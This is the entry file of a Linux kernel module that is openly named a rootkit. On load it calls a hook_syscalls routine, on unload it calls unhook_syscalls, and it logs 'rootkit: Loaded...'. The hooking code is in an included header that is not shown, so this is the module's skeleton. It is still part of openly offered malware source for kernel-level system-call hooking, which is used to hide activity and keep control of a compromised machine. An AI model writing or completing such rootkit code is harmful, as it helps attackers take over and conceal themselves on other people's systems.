#include <linux/module.h>

#include "syscalls/syscalls.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("m4dpr0ph37");

static int __init rootkit_init(void)
{
  hook_syscalls();
  printk(KERN_DEBUG "rootkit: Loaded...\n");
  return 0;
}

static void __exit rootkit_exit(void)
{
  unhook_syscalls();
  printk(KERN_DEBUG "rootkit: Unloaded...\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
